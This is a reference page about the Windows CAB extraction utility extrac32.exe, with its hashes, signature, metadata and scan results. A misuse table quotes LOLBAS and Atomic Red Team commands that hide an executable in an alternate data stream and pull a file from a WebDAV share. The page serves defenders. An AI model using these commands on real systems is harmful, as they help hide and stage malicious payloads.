---
title: extrac32.exe | Microsoft CAB File Extract Utility
excerpt: What is extrac32.exe?
---

# extrac32.exe 

* File Path: `C:\Windows\system32\extrac32.exe`
* Description: Microsoft CAB File Extract Utility

## Hashes

Type | Hash
-- | --
MD5 | `8D6D545BA6D9BA01A18D52A28BDAC15A`
SHA1 | `8935E73FDC7927E853E06CC2BC798CEBF9BC8B7E`
SHA256 | `53BEF52AA01713756DB903DC6A6983543217219D898B78E75B0E0642C02BBD45`
SHA384 | `5FC9344F054962E3DFBA2FCCC25F3C4CCADFD44489BC98C5948FD027C0EFEC8E6E447C721C9801CE9B4765410076A128`
SHA512 | `3636BA749CFCC9DC072F2A91B420D2752649AE25A0A58835D78386F7F13B74CBA27B3D8B51A84713DC5BFED6DECBB8C5D01ED24B0585B5D085088E95ED88963A`
SSDEEP | `768:LGR0UuK1ZZEAYPE9i1q5FhlNzxTfjz7zaoDxeaP9OUe2TvKA:QT5EJE9iwxxTfjz7zaexeq9OUeiKA`
IMP | `9E8A016B1763601647B4DFBEF00DAC86`
PESHA1 | `C4448FCB9F8F8DFEA2E74540763EC3B5D926C3CA`
PE256 | `D9C629DFA7D64A5E0F3E9B51999D7274934AB09D1A0D8C6058D5A3A56BCCEF64`

## Runtime Data

### Usage (stdout):
```cmhg
Microsoft (R) Cabinet Extraction Tool
Copyright (c) Microsoft Corporation. All rights reserved..

EXTRACT [/Y] [/A] [/D | /E] [/L dir] cabinet [filename ...]
EXTRACT [/Y] source [newname]
EXTRACT [/Y] /C source destination

  cabinet  - Cabinet file (contains two or more files).
  filename - Name of the file to extract from the cabinet.
             Wild cards and multiple filenames (separated by
             blanks) may be used.

  source   - Compressed file (a cabinet with only one file).
  newname  - New filename to give the extracted file.
             If not supplied, the original name is used.

  /A         Process ALL cabinets.  Follows cabinet chain
             starting in first cabinet mentioned.
  /C         Copy source file to destination (to copy from DMF disks).
  /D         Display cabinet directory (use with filename to avoid extract).
  /E         Extract (use instead of *.* to extract all files).
  /L dir     Location to place extracted files (default is current directory).
  /Y         Do not prompt before overwriting an existing file.
```

## Signature

* Status: Signature verified.
* Serial: `33000001C422B2F79B793DACB20000000001C4`
* Thumbprint: `AE9C1AE54763822EEC42474983D8B635116C8452`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: extrac32.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 5.00 (WinBuild.160101.0800)
* Product Version: 5.00
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/73
* VirusTotal Link: https://www.virustotal.com/gui/file/53bef52aa01713756db903dc6a6983543217219d898b78e75b0e0642c02bbd45/detection/

## File Similarity (ssdeep match)

File | Score
-- | --
[C:\WINDOWS\system32\extrac32.exe](extrac32.exe-EEBADE0CB17D75DCEF4CD47723821353.md) | 43

## Possible Misuse

*The following table contains possible examples of `extrac32.exe` being misused. While `extrac32.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `Name: Extrac32.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Path: C:\Windows\System32\extrac32.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Path: C:\Windows\SysWOW64\extrac32.exe` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md) | extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020 Strontic.


